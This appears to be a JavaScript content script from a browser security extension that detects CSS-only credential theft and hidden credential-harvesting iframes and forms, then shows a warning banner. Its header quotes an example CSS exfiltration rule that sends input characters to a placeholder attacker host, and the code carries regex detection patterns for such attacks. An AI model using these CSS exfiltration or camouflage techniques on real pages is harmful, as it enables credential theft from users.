/**
 * extension/content/style_auditor.js
 *
 * StyleAuditor — CSS Credential Exfiltration + LOTL DOM Camouflage
 *
 * Detects two converging threats:
 * 1. CSS Exfiltration: input[value^="a"] { background: url(https://evil/a); }
 *    exfiltrates input characters without JavaScript. Bypasses CSP script-src.
 * 2. LOTL DOM Camouflage: CSS opacity:0, clip-path, off-screen positioning to
 *    hide credential-harvesting iframes/forms. Browser equivalent of Windows
 *    LOLBins — using trusted CSS features for credential theft.
 *
 * Extends Wave 7 autofill detection to cover CSS-only hiding techniques
 * (not display:none or type=hidden, which AutofillGuard already catches).
 *
 * Signal architecture:
 *   style:css_exfil_attribute_selector    +0.40
 *   style:hidden_iframe_credential_load   +0.30
 *   style:invisible_form_autofill_trap    +0.25
 *   style:css_import_exfil_chain          +0.20
 *   style:dynamic_style_injection         +0.15
 *
 * Alert threshold: 0.50 | Block threshold: 0.70
 *
 * @module StyleAuditor
 */

'use strict';

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

const CSS_EXFIL_PATTERNS = [
  /input\[value[^\]]*\]\s*\{[^}]*url\s*\(/i,
  /input\[type=["']password["']\]\[value/i,
  /\[name=["']?(password|passwd|pass|pwd)["']?\]\[value/i,
];

const AUTH_PROVIDER_IFRAME_DOMAINS = [
  'login.microsoftonline.com',
  'accounts.google.com',
  'login.live.com',
  'appleid.apple.com',
  'login.okta.com',
];

const CREDENTIAL_SELECTORS = [
  'input[type="password"]',
  'input[type="email"]',
  'input[autocomplete="username"]',
  'input[autocomplete="current-password"]',
];

/* ------------------------------------------------------------------ */
/*  Signal Functions                                                    */
/* ------------------------------------------------------------------ */

/**
 * Check if any stylesheet contains CSS attribute selectors targeting
 * input[value] combined with url() — CSS keylogging pattern.
 */
function checkCssExfilAttributeSelector(doc) {
  if (!doc) return [];

  // Check inline <style> elements
  const styles = doc.querySelectorAll('style');
  for (const style of styles) {
    const content = style.textContent || '';
    for (const pattern of CSS_EXFIL_PATTERNS) {
      if (pattern.test(content)) {
        return [{
          id: 'style:css_exfil_attribute_selector',
          weight: 0.40,
          source: 'inline_style',
        }];
      }
    }
  }

  // Check style attributes on elements (less common but possible)
  const elementsWithStyle = doc.querySelectorAll('[style*="url"]');
  for (const el of elementsWithStyle) {
    const styleAttr = el.getAttribute('style') || '';
    if (/input\[value/i.test(el.parentElement?.innerHTML || '') && /url\s*\(/i.test(styleAttr)) {
      return [{
        id: 'style:css_exfil_attribute_selector',
        weight: 0.40,
        source: 'style_attribute',
      }];
    }
  }

  return [];
}

/**
 * Check for iframes with CSS-hidden visibility that load auth provider domains.
 * Techniques: opacity:0, clip-path:inset(100%), off-screen position, height:0+overflow:hidden.
 */
function checkHiddenIframeCredentialLoad(doc) {
  if (!doc) return [];

  const iframes = doc.querySelectorAll('iframe');

  for (const iframe of iframes) {
    const src = iframe.getAttribute('src') || '';
    const isAuthDomain = AUTH_PROVIDER_IFRAME_DOMAINS.some(d => src.includes(d));
    if (!isAuthDomain) continue;

    const style = iframe.getAttribute('style') || '';
    const isHidden =
      /opacity\s*:\s*0(?:[^.]|$)/i.test(style) ||
      /clip-path\s*:\s*inset\s*\(\s*100%/i.test(style) ||
      /position\s*:\s*absolute[^;]*;\s*(?:left|top)\s*:\s*-\d{4,}/i.test(style) ||
      (/height\s*:\s*0/i.test(style) && /overflow\s*:\s*hidden/i.test(style));

    if (isHidden) {
      return [{
        id: 'style:hidden_iframe_credential_load',
        weight: 0.30,
        src: src.substring(0, 200),
        technique: style.substring(0, 100),
      }];
    }

    // Also check inline width/height attributes (only if explicitly set)
    const widthAttr = iframe.getAttribute('width');
    const heightAttr = iframe.getAttribute('height');
    if (widthAttr !== null && heightAttr !== null) {
      const width = parseInt(widthAttr);
      const height = parseInt(heightAttr);
      if ((width === 0 || height === 0) && isAuthDomain) {
        return [{
          id: 'style:hidden_iframe_credential_load',
          weight: 0.30,
          src: src.substring(0, 200),
          technique: 'zero_dimension',
        }];
      }
    }
  }

  return [];
}

/**
 * Check for credential fields with CSS-based invisibility.
 * Covers: opacity < 0.01, clip-path inset, off-screen positioning.
 * Does NOT flag display:none or type=hidden (AutofillGuard covers those).
 */
function checkInvisibleFormAutofillTrap(doc) {
  if (!doc) return [];

  for (const selector of CREDENTIAL_SELECTORS) {
    const fields = doc.querySelectorAll(selector);
    for (const field of fields) {
      const style = field.getAttribute('style') || '';
      const parentStyle = field.parentElement?.getAttribute('style') || '';
      const combinedStyle = style + ' ' + parentStyle;

      const isInvisible =
        /opacity\s*:\s*0(?:[^.]|$)/i.test(combinedStyle) ||
        /clip-path\s*:\s*inset\s*\(\s*100%/i.test(combinedStyle) ||
        /clip-path\s*:\s*inset\s*\(\s*50%\s+50%/i.test(combinedStyle) ||
        /position\s*:\s*absolute[^;]*;\s*(?:left|top)\s*:\s*-\d{4,}/i.test(combinedStyle);

      if (isInvisible) {
        return [{
          id: 'style:invisible_form_autofill_trap',
          weight: 0.25,
          fieldType: field.getAttribute('type') || 'text',
          technique: combinedStyle.substring(0, 100),
        }];
      }
    }
  }

  return [];
}

/**
 * Check for @import url() chains pointing to external domains.
 * CSS exfiltration staging technique.
 */
function checkCssImportExfilChain(doc, hostname) {
  if (!doc || !hostname) return [];

  const styles = doc.querySelectorAll('style');
  const importPattern = /@import\s+url\s*\(\s*['"]?(https?:\/\/[^'")\s]+)/gi;

  for (const style of styles) {
    const content = style.textContent || '';
    let match;
    let externalImportCount = 0;

    while ((match = importPattern.exec(content)) !== null) {
      try {
        const importUrl = new URL(match[1]);
        if (importUrl.hostname !== hostname &&
            !importUrl.hostname.endsWith('.' + hostname)) {
          externalImportCount++;
        }
      } catch (_) {
        // Invalid URL
      }
    }

    if (externalImportCount >= 1) {
      return [{
        id: 'style:css_import_exfil_chain',
        weight: 0.20,
        externalImportCount,
      }];
    }
  }

  return [];
}

/**
 * Check for dynamically inserted <style> elements containing exfil patterns.
 * Returns initial signals from existing dynamic styles.
 */
function checkDynamicStyleInjection(doc) {
  if (!doc) return [];

  // Check for style elements that appear to be dynamically generated
  // (e.g., no type attribute, inline, and contain exfil patterns)
  const styles = doc.querySelectorAll('style:not([data-static])');

  for (const style of styles) {
    const content = style.textContent || '';
    // Check for exfil patterns in dynamically-looking styles
    if (CSS_EXFIL_PATTERNS.some(p => p.test(content))) {
      return [{
        id: 'style:dynamic_style_injection',
        weight: 0.15,
      }];
    }
  }

  return [];
}

/* ------------------------------------------------------------------ */
/*  Risk Scoring                                                       */
/* ------------------------------------------------------------------ */

function calculateStyleRiskScore(signals) {
  if (!signals || signals.length === 0) return { riskScore: 0, signalList: [] };

  const riskScore = Math.min(signals.reduce((sum, s) => sum + s.weight, 0), 1.0);
  const signalList = signals.map(s => s.id);

  return { riskScore, signalList };
}

/* ------------------------------------------------------------------ */
/*  Warning Banner                                                     */
/* ------------------------------------------------------------------ */

function injectStyleWarningBanner(riskScore, signals) {
  if (typeof document === 'undefined') return;
  if (document.getElementById('phishops-style-banner')) return;

  const severity = riskScore >= 0.90 ? 'Critical' : riskScore >= 0.70 ? 'High' : 'Medium';

  const banner = document.createElement('div');
  banner.id = 'phishops-style-banner';
  banner.setAttribute('style', [
    'position:fixed', 'top:0', 'left:0', 'right:0', 'z-index:2147483647',
    'background:#BF1B1B', 'color:#F5F0E8', 'padding:12px 16px',
    'font-family:system-ui,-apple-system,sans-serif', 'font-size:14px',
    'text-align:center', 'box-shadow:0 2px 8px rgba(0,0,0,0.5)',
  ].join(';'));

  banner.innerHTML = `
    <strong>PhishOps Warning — CSS Credential Exfiltration Detected</strong>
    <div style="font-size:12px;margin-top:4px;">
      Severity: ${severity} | Risk: ${riskScore.toFixed(2)} |
      Signals: ${signals.map(s => s.id.replace('style:', '')).join(', ')}
    </div>
    <button id="phishops-style-dismiss" style="
      position:absolute;top:8px;right:12px;background:none;border:1px solid #F5F0E8;
      color:#F5F0E8;padding:2px 8px;cursor:pointer;font-size:12px;
    ">dismiss</button>
  `;

  document.documentElement.appendChild(banner);

  document.getElementById('phishops-style-dismiss')?.addEventListener('click', () => {
    banner.remove();
  });
}

/* ------------------------------------------------------------------ */
/*  Main Analysis                                                      */
/* ------------------------------------------------------------------ */

function runStyleAuditorAnalysis() {
  if (typeof document === 'undefined') return;

  const hostname = globalThis.location?.hostname || '';
  if (!hostname) return;

  const doc = document;

  const exfilSignals = checkCssExfilAttributeSelector(doc);
  const iframeSignals = checkHiddenIframeCredentialLoad(doc);
  const trapSignals = checkInvisibleFormAutofillTrap(doc);
  const importSignals = checkCssImportExfilChain(doc, hostname);
  const dynamicSignals = checkDynamicStyleInjection(doc);

  const allSignals = [
    ...exfilSignals,
    ...iframeSignals,
    ...trapSignals,
    ...importSignals,
    ...dynamicSignals,
  ];

  const { riskScore, signalList } = calculateStyleRiskScore(allSignals);

  if (riskScore < 0.50) return;

  const severity = riskScore >= 0.90 ? 'Critical' : riskScore >= 0.70 ? 'High' : 'Medium';
  const action = riskScore >= 0.70 ? 'blocked' : 'alerted';

  injectStyleWarningBanner(riskScore, allSignals);

  if (typeof chrome !== 'undefined' && chrome.runtime?.sendMessage) {
    chrome.runtime.sendMessage({
      type: 'STYLEAUDITOR_EVENT',
      payload: {
        eventType: 'CSS_CREDENTIAL_EXFIL_DETECTED',
        riskScore,
        severity,
        signals: signalList,
        url: globalThis.location?.href || '',
        timestamp: new Date().toISOString(),
        action,
      },
    }).catch(() => {});
  }
}

/* ------------------------------------------------------------------ */
/*  Auto-bootstrap                                                     */
/* ------------------------------------------------------------------ */

if (typeof document !== 'undefined' && typeof process === 'undefined') {
  runStyleAuditorAnalysis();
}

/* ------------------------------------------------------------------ */
/*  Test export bridge                                                 */
/* ------------------------------------------------------------------ */
// Chrome MV3 content scripts are classic scripts — top-level `export`
// throws SyntaxError. Register public API on a global namespace so
// vitest can side-effect-import and read from the global.

if (typeof globalThis !== 'undefined') {
  globalThis.__phishopsExports = globalThis.__phishopsExports || {};
  globalThis.__phishopsExports['style_auditor'] = {
    checkCssExfilAttributeSelector,
    checkHiddenIframeCredentialLoad,
    checkInvisibleFormAutofillTrap,
    checkCssImportExfilChain,
    checkDynamicStyleInjection,
    calculateStyleRiskScore,
    injectStyleWarningBanner,
    runStyleAuditorAnalysis,
  };
}
